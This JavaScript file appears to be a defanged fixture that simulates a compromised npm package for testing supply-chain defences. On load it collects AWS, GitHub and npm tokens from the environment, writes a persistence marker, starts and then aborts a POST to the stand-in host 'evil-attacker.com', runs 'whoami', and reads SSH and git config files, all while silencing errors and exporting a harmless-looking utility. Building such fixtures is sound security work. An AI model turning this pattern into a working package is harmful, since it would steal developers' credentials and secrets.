/**
 * Malicious Package Simulation
 * Demonstrates supply-chain attack behaviors
 */

'use strict';

const fs = require('fs');
const path = require('path');
const os = require('os');
const https = require('https');
const { exec } = require('child_process');

// This simulates a compromised package doing malicious things

// 1. Steal environment variables (credential theft)
console.log('[malicious-package] Loading...');

const sensitiveVars = [
    process.env.AWS_ACCESS_KEY_ID,
    process.env.AWS_SECRET_ACCESS_KEY,
    process.env.DATABASE_URL,
    process.env.API_KEY,
    process.env.GITHUB_TOKEN,
    process.env.NPM_TOKEN,
    process.env.HOME,
    process.env.USER,
    process.env.PATH
];

// 2. Try to write persistence file
try {
    const maliciousFile = path.join(os.tmpdir(), '.malicious-config');
    fs.writeFileSync(maliciousFile, JSON.stringify({
        backdoor: true,
        exfiltrated: new Date().toISOString()
    }), 'utf8');

    // Clean up immediately so we don't pollute the system
    setTimeout(() => {
        try { fs.unlinkSync(maliciousFile); } catch (e) { }
    }, 100);
} catch (err) {
    // Silent failure
}

// 3. Attempt data exfiltration via network
try {
    const req = https.request({
        hostname: 'evil-attacker.com',
        port: 443,
        path: '/exfiltrate',
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        }
    });

    req.on('error', () => { }); // Silent
    req.destroy(); // Abort immediately (we don't want to actually connect)
} catch (err) {
    // Silent
}

// 4. Try to execute shell command for reconnaissance
try {
    exec('whoami', (error, stdout, stderr) => {
        // Would send this data to attacker's server
    });
} catch (err) {
    // Silent
}

// 5. Read sensitive files
try {
    const homeDir = os.homedir();
    const sshConfig = path.join(homeDir, '.ssh', 'config');
    const gitConfig = path.join(homeDir, '.gitconfig');

    if (fs.existsSync(sshConfig)) {
        fs.readFileSync(sshConfig, 'utf8');
    }

    if (fs.existsSync(gitConfig)) {
        fs.readFileSync(gitConfig, 'utf8');
    }
} catch (err) {
    // Silent
}

console.log('[malicious-package] Loaded successfully (malicious activities hidden)');

module.exports = {
    // Pretends to be a legitimate utility
    version: '1.3.7',
    doSomething: () => 'Everything is fine!'
};
